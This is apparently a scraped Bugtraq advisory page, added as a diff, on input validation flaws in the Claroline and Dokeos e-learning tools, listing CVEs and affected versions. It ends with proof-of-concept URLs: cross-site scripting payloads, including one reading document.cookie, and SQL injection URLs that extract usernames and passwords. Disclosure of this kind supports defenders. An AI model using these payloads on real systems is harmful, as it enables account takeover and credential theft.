@@ -1,0 +1,120 @@
+#SpeeDr00t@Black Falcon<br>#bid13407<p><b><span style="font-size: 18pt;">Claroline E-Learning Application Multiple Remote Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13407/info">info</a><br><a href="http://www.securityfocus.com/bid/13407/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13407/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13407/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13407/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13407
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-1374<br/>
+				
+					CVE-2005-1375<br/>
+				
+					CVE-2005-1376<br/>
+				
+					CVE-2005-1377<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 27 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 02:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Sieg Fried &lt;Siegfried@zone-h.org&gt; is credited with the discovery of these issues.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Dokeos Open Source Learning &amp; Knowledge Management Tool 1.5.5 <br/>
+					
+				
+					Claroline Claroline 1.6 rc1<br/>
+					
+				
+					Claroline Claroline 1.6 beta<br/>
+					
+				
+					Claroline Claroline 1.5.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Dokeos Open Source Learning &amp; Knowledge Management Tool 1.6  RC2<br/>
+					
+				
+					Claroline Claroline 1.6 <br/>
+					
+				
+					Claroline Claroline 1.5.4 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage any of these issues.  The following proof of concepts have been provided:<br/><br/>Cross-site scripting proof of concepts:<br/>http:///www.example.com/claroline/tracking/toolaccess_details.php?tool=%3Cscript%3Ealert('xss');%3C/script%3E<br/>http:///www.example.com/claroline/tracking/user_access_details.php?cmd=doc&amp;amp;data=%3Cscript%3Ealert('xss');%3C/script%3E<br/>http:///www.example.com/claroline/calendar/myagenda.php?coursePath=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/><br/>SQL Injection proof of concepts:<br/>http:///www.example.com/claroline/user/userInfo.php?uInfo=-1%20UNION%20SELECT%20username,password,0,0,0,0,0%20from%20user%20where%20user_id=1/*<br/>http:///www.example.com/claroline/tracking/exercises_details.php?exo_id=-1/**/UNION/**/SELECT%200,password,username,0,0,0%20from%20user%20where%20user_id=1--
+	
+		<ul>
+</ul>
+</div>
